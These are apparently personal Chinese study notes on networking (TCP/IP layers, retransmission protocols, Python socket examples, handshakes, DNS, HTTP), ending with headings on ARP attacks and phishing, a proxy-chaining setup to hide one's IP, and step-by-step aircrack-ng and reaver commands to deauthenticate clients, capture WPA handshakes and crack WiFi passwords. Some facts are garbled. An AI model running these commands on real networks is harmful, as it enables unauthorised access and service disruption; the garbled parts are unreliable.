 应用层  运输层(TCP UDP)   网络层(IP)

#### TCP/IP协议

运输层协议为进程之间提供了逻辑通讯

网络层协议一般是在各个服务器之间进行传输,属于大对象与大对象之间的,而运输层协议属于内部的协议.一般只在端系统内进行运作

ip包经过ip协议加工，通过路由器进行转发，特点是按块发送，经过多个路由设备，不保证送达也不保证顺序到达。

将主机间的交互拓展到进程之间的交互称为运输层的多路复用和多路分解 多路分解就是将传过来运输层报文段成不同的部分 而复用就是将多个段组合成不同的部分.

TCP协议建立在IP协议之上，负责在两台计算机之间建立可靠的连接，保证数据包的顺序到达，通过握手建立连接，对每个IP包进行编号，保证能够顺序收到，掉包就重新发送,这种一般是可靠交付方式,当链路变得很堵塞的时候,TCP发送方也会从新发送之前的报文段,直到收到了"ok收到了不用发了"的指令才停止.

在发送方与接收方的交互中，大家可以看到使用了差错检测，接收方反馈，重传这三个功能来实现数**可靠数据传输**

***

**回退N步协议(GBN)** 采用累计确认,当发送方收到一个对分组n的ACK的时候,表示n之前的都已收到

​	超时触发会使得窗口内的所有已发送未接收到相应的分组都要被重传,

接收方比较简单 直接按顺序接受,如果接收到了后面的数据直接扔掉

**选择重传(SR)** 属于对单个数据进行跟踪的协议,如果出现了未接受到消息的 则单独发送一个数据而不是全部, 

***

常用命令:

telnet ip 端口  进行端口的tcp协议通讯测试

nc -z ip 端口 端口tcp协议

nc-uz udp的

nc还可查看多个端口 nc -uz ip 20-30 多个端口测试

netstat -a 查看已经连接的端口号

***

TCP连接 需要一个客户端一个服务端



#### socket编程

***

- Python实现

  ***

  ​	客户端：

  ​		基本步骤：

  ​				建立一个socket ，建立连接(需要指明域名或者ip)，发送数据，接受数据，关闭连接

  ```python
  import socket
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#这个是一个tcp套接字,而如果是SOCK_DGRAM则是一个UDP的协议
  # 建立连接:
  s.connect(('127.0.0.1', 9999))
  # 接收欢迎消息:
  print s.recv(1024)
  for data in ['Michael', 'Tracy', 'Sarah']:
      # 发送数据:
      s.send(data)
      print s.recv(1024)
  s.send('exit')
  s.close()
  ```

  

  ​	服务端;

  ```python
  #!/usr/bin/env python
  # -*- coding: utf-8 -*-
  
  
  import time, socket, threading
  
  def tcplink(sock, addr):
      print 'Accept new connection from %s:%s...' % addr
      sock.send('Welcome!')
      while True:
          data = sock.recv(1024)
          time.sleep(1)
          if data == 'exit' or not data:
              break
          sock.send('Hello, %s!' % data)
      sock.close()
      print 'Connection from %s:%s closed.' % addr
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  # 监听端口:
  s.bind(('127.0.0.1', 9999))
  s.listen(5)
  print 'Waiting for connection...'
  while True:
      # 接受一个新连接:
      sock, addr = s.accept()
      # 创建新线程来处理TCP连接:
      t = threading.Thread(target=tcplink, args=(sock, addr))
  t.start()
  ```

   

  bind函数一般在connect和listen之前使用，socket建立套接口之后，就存在一个地址族之中，但是并没有赋名，主要给其分配本地的端口给变量。

 listen将一个主动的进程变成一个服务端的被动的接受进程。一般在绑定端口后和accept之前调用。

所以服务器上有两个套接字，一个用于不停的监听一个用于接受和发送。



TCP/IP协议集 一般为**四层** 第一层为物理通讯的接口，第二层为网络层，多个网络协议，用于实现物理地址和逻辑地址的转换，就是说能够识别计算机的地址。第三层是传输层TCP，用于数据的传递。第五层是应用层，用于进一步的提升。

ip地分配原则 为同一网络内的不同主句分配相同的网络号，不同的主机号

ip分配下来后 通过子网掩码进行分割，**将ip地址分为网络号和主机号**

也就相当于网段号和主机号 前三个就是网段号 后面那个就是主机号

![IP与子网掩码的关系](https://img-blog.csdn.net/20160427105221679)

网络层提供主机间的逻辑通信，运输层提供端口间的逻辑通信。

TCP建立连接需要三次握手，也就是客户端额服务端一共需要发送三个包才能确认建立的连接。

​	第一次握手：客户端发送**SYN包，SYN = 1，ack = 0，随机产生一个值给seg=x**，给服务发送请求，客户端进入SYN_SENT等待服务器确认。发送**SYN包**　ＳＹＮ为请求的作用

​	第二次握手，服务器就收到SYN包，知道了客户端在请求连接，发送**SYN+ACK=1 ，ack = x+1，seg=Y**的包给客户端，服务器进入SYN_RCVD状态.发送**ＳＹＮ＋ＡＣＫ包**

​		第二次握手的时候发送的包包括确认包也包括一个请求包．

​	第三次握手：客户端收到包，检查ack是不是x+1 ACK的标示是不是1，如果正确发送**ACK包 **ACK=1，ack=Y+1，将ACK发送给服务器，服务器进行判断，如果正确，则进入ESTABLISHED状态病并开始传输数据

一般的ＡＣＫ包是用来进行数据传输的确认的．

TCP的断开 四次挥手

ＴＣＰ的连接是全双工的，每个方向都需要进行单独的关闭，就是发送一个ＦＩＮ的包，收到Ｆ包则这个方向上不能收到数据了　但是自己可以发送数据．

第一次挥手：客户端发送一个ＦＩＮ包给服务器，

第二次挥手：服务器收到后发送一个ＡＣＫ进行确认

第三次挥手：服务器发送一个ＦＩＮ包给客户端

第四次挥手：客户端进行数据位的确认并发送一个ＡＣＫ给服务器



![img](https://img-blog.csdn.net/20160219154603439?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

为什么需要三次握手四次挥手????少几次可不可以？？？？

三次握手可以防止已经失效的请求进行连接，比如一个已经逗留的很长时间的请求进入服务器，那么服务器就直接返回一个包，说自己可以建立连接，但是客户端没有请求建立连接，两次握手的话，客户端无法给服务器一个提示说自己没有请求建立连接．





应用层;

​	ＤＮＳ域名解析　ＦＴＰ　ＷＷＷ　等

HTTP FTP SMTP DNS都是应用层的协议 而一般的DNS是属于和其他的协议进行组合的协议

应用层协议

P2P的模式可以使得计算机既是客户端又是服务端

套接字是应用层到传输层的一个通用的接口



可靠数据传输

吞吐量  **带宽敏感传输 ** 一般的多媒体

****

**交换机**

交换机有一个基本MAC地址进行STP选举 ,

交换机的每一个端口都有一个自己的MAC地址 而且是按照顺序进行逐个加一

二层交换机属于链路层设备 每个端口一个MAC地址 但是只能配置一个ip地址

三层交换机属于上层设备,有MAC地址和**每个端口的IP地址**

***

### 计算机网络自顶向下方法

***

路由器也就是进行数据包的转发的作用.

协议一般控制着因特网中的信息的接受和传送

socket是应用程序进程和运输层协议之间的接口.



选择协议的方式:

​	可靠数据传输   一般属于对数据比较敏感的 比如银行 邮件等等  而像视频音频等可以容忍丢失 

​	吞吐量  可用吞吐量 就是发送进程能够像接受进程交付比特的速率

​	定时和安全性

HTTP是应用层的协议

常用的应用程序协议:

​	UDP 和TCP协议  

TCP包括面向连接服务和可靠数据传输服务

- 面向连接的服务在进行数据传输之前需要先建立连接,通过握手建立连接,之后全双工发送数据,结束之后拆除连接.
- 可靠数据传输 **能够无差错的按顺序的进行数据的交付**

TCP还有拥塞控制机制

TCP和UDP都没有任何的加密机制  因此在应用层上进行的数据的加密 SSL加密



UDP是无连接的  因此在进行数据传输之前是不存在任何的握手过程的.

UDP不会保证数据的传输顺序和是否到达



***

电子邮件的主要应用层协议是SMTP

***

web的应用层协议是超文本传输协议HTTP   使用的是TCP作为运输协议   HTTP属于一个无状态协议 就是不会记住客户端以前是否提交过请求



***

HTTP的报文有两种 第一种是请求报文 第二个是相应报文

???????????????????????????????????????????????????????????

GET  请求行

HOST 首部行

Connection

User-agent

accept-language

***

web在进行连接的时候 首先进行连接的是WEB的缓存器 同时会发送cookie进行用户身份的判别



一般HTTP的协议是一个拉协议 和SMTP协议是一个推协议

通过SMTP协议 将本机上或者邮件发送端的邮件发送到邮件服务器上,之后通过POP协议让收件人获取到邮件



DNS的作用就是通过域名来查找到ip地址的方法 在进行握手的时候就已经进行了查询,是擦偶偶系统进行的,

浏览器中想访问 `www.google.com` 时，会进行一下操作：

1. 操作系统会首先在本地缓存中查询
2. 没有的话会去系统配置的 DNS 服务器中查询
3. 如果这时候还没得话，会直接去 DNS 根服务器查询，这一步查询会找出负责 `com` 这个一级域名的服务器
4. 然后去该服务器查询 `google` 这个二级域名
5. 接下来三级域名的查询其实是我们配置的，你可以给 `www` 这个域名配置一个 IP，然后还可以给别的三级域名配置一个 IP

以上介绍的是 DNS 迭代查询，还有种是递归查询，区别就是前者是由客户端去做请求，后者是由系统配置的 DNS 服务器做请求，得到结果后将数据返回给客户端。

PS：DNS 是基于 UDP 做的查询。

***

### 从输入URL到页面加载完成的过程:

1. 首先进行DNS解析,将域名解析成对应的ip地址

2. 之后进行TCP握手进行连接,同时指明两端的端口号,然后下发给网络层.网络层确定ip,之后执行物理层面的传输,

3. 之后右TCL握手,进行正式的数据传输

4. 传输的数据在进到服务器之前,会先进行过负载均衡的服务器,将数据合理的分发到多台服务器上.之后服务器进行响应

5. 浏览器进行判断状态码是什么,200正常 继续解析,400或500报错,300进行重定位,重定位次数过多也会报错.

6. 然后浏览器解析文件,如果是gzip的格式会先解压一下,然后通过文件的编码格式知道如何去进行解码文件.

7. 解析完成后进行渲染,

   ***

一般的DNS服务器是进行分布式的数据库方案 ,有三类服务器第一个是根服务器,之后是顶级域DNS服务器之后是权威DNS服务器.当进行访问www.google.com的时候,首先进行的是对根服务器的访问,返回域名com的域名DNS服务器的ip,之后域名服务器返回Google的权威服务器的IP之后在返回www.xxxx.com的IP

DNS服务器还能够将数据进行暂时的缓存,加快访问的速度.

***

物理地址指的是在进行数据链路层和物理层的通讯的时候进行实际的地址,而逻辑地址是网络层和上面各层进行交互的时候使用的地址.



网络层的三个主要的控件:

IP协议 路由选择协议 因特网控制报文协议ICMP

***

需要使用的软件:
WinPCap



#### ARP攻击

广播查询IP对应的MAC地址 之后这个IP的人回个声 然后进行MAC的链路层的通讯

#### DHCP 钓鱼

#### 路由器漏洞

#### PPPoE 钓鱼

#### WiFi 热点钓鱼





****

- 多重代理正宗的做法】如下： 　　装2个虚拟机系统（简称 A 系统 和 B 系统）。A 系统装翻墙软件，配置双网卡，分别用 NAT 模式和  Host-Only 模式。B 系统装 QQ，单网卡，配置为 Host-Only 模式。然后配置 QQ 的代理，让 QQ 的代理指向 A  系统的翻墙软件。由于 B 系统的网卡是 Host-Only 模式，QQ 客户端即使想偷偷地直连服务器，也办不到。所以，QQ 只能老老实
- 实地通过 A 系统中转。由于 A 系统的中转是通过翻墙代理，最终 QQ 服务器看到的是翻墙代理的 IP，看不到你本人的真实 IP。





****

**airdump都是数据包的捕获以及监听特定数据包进行的**

**airmon-ng 处理网卡工作模式**

**aircrack-ng 破解**

**aireplay-ng 发包，干扰**

****

**连上之后先start设备进行网卡监听的模式 sudo airmon-ng start 设备

**之后进行扫描设备 sudo airodump-ng mon0 进行wifi扫描

**之后监听特定的频道:

sudo airodump-ng -c 6 -w Desktop/handshake --bssid C0:00:00:00:00:48 mon0

**之后进行强行攻击:

```
sudo aireplay -0 0 -a C8:3A:35:2D:A7:F8 -c DC:74:A8:08:B7:D0 wlan0mon
-0表示进行攻击 0 表示攻击次数无限次 -a表示是服务端 -c是客户端
```

**之后进行获取到握手包:

```
sudo airodump-ng -c 6-ivs -w test --bssid C8:3A:35:2D:A7:F8 wlan0mon
```

**之后进行破解:

```
sudo aircrack-ng -w 1.txt test-02.ivs-01.ivs
```





pin破解:

```
sudo reaver -i mon0 -b 5C:63:BF:C4:A4:CE -vv 
```